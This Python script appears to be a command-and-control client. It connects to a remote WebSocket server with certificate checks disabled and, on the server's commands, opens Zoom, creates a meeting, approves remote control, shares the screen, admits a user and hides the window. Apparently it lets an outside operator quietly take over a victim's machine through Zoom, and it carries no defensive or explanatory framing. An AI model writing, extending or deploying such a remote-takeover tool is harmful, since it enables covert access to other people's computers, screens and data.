import websocket
import ssl
import rel
import os
import json
from dotenv import load_dotenv
from zoomer import (
  open_zoom_app,
  create_zoom_room,
  approve_remote_control,
  press_enter,
  share_screen,
  admit_user,
  switch_tab,
  switch_window,
  focus_zoom_meeting,
  hide_window,
)
import time
import threading

load_dotenv()

APP_NAME = os.environ['APP_NAME']
websocket_server_url = "wss://streamlineanalytics.net:10001"

def on_message(ws, message):
    if message == 'open':
        open_zoom_app()
    elif message == 'create':
        create_zoom_room()
    elif message == 'approve' or message == "accept":
        approve_remote_control()
    elif message == 'enter':
        press_enter()
    elif message == 'share':
        share_screen()
    elif message == 'admit':
        admit_user()
    elif message == 'switchtab':
        switch_tab()
    elif message == 'switch':
        switch_window()
    elif message == 'focus':
        focus_zoom_meeting()
    elif message == 'hide':
        hide_window()

def on_error(ws, error):
    print(error)

def on_close(ws, close_status_code, close_msg):
    print("### closed ###")

def on_open(ws):
    print("Opened connection")
    ws.send_text(json.dumps({"room": APP_NAME, "type": "join"}))

def ws_thread():
    while True:
        ws = websocket.WebSocketApp(websocket_server_url,
                                on_error=on_error,
                                on_close=on_close,
                                on_open=on_open,
                                on_message=on_message)

        ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE}, reconnect=5, ping_interval=10, ping_timeout=9)
        time.sleep(3600 * 3)
        ws.close()

if __name__ == "__main__":
    websocket.enableTrace(False)

    ws_thread_handler = threading.Thread(target=ws_thread)
    ws_thread_handler.start()

    rel.signal(2, rel.abort)  # Keyboard Interrupt
    rel.dispatch()